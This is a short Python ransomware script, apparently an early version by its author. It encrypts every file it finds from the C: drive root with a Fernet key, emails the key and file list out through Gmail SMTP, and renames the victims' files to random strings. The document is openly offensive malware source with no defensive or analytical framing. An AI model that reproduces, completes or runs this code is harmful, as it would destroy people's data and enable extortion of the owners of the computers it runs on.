import os
import random
import string
import smtplib
from time import sleep
from cryptography.fernet import Fernet


class Ransomware:
    def __init__(self, 
                 files=[], 
                 directories=[], 
                 files_dict={}, 
                 key=Fernet.generate_key()
                 ):
        
        os.chdir("C:/")  # Mac -> /Users  || Linux -> /home
        self.files = files
        self.directories = directories
        self.key = key
        self.files_dict = files_dict

        self.message = f"KEY : {key} +\n files_list : {files}"

    def id_generator(self, 
                     size, 
                     chars=string.ascii_lowercase + string.digits
                    ):
                        
        return ''.join(random.choice(chars) for _ in range(size))

    def files_dir(self):
        for _ in os.listdir():
            if _ == "ransom.py":
                continue  # Do not encrypt the current file we are working with or the key

            elif os.path.isfile(_):
                self.files.append(_)  # Do not add if this is a directory, only if a file

            elif os.path.isdir(_):
                self.directories.append(_)

        for dirs in self.directories:
            if dirs == "ransom.py":
                continue  # Do not encrypt the current file we are working with or the key

            elif os.path.isfile(dirs):
                self.files.append(dirs)

            elif os.path.isdir(dirs):
                os.chdir(dirs)

    def encrypt_loop(self):
        for file in self.files:
            with open(file, "rb") as the_file:
                contents = the_file.read()

            contents_encrypted = Fernet(self.key).encrypt(contents)

            with open(file, "wb") as the_file:
                the_file.write(contents_encrypted)

    def rename_files(self):
        for _ in self.files:
            if _ == '.DS_Store':
                continue

            name = self.id_generator(random.randint(16, 21))
            ext = "." + self.id_generator(random.randint(7, 10))

            last = f"{name}{ext}"

            self.files_dict.update({last: _})

            os.rename(_, last)

    def mail_send(self, 
                  email="", 
                  password=""
                 ):
                     
        msg = self.message
        email_server = smtplib.SMTP("smtp.gmail.com", 587)
        email_server.starttls()
        email_server.login(email, password)
        email_server.sendmail(email, email, msg)
        sleep(10)
        email_server.quit()


starter = Ransomware()
starter.files_dir()
starter.encrypt_loop()
starter.mail_send()
starter.rename_files()

# a lot coming
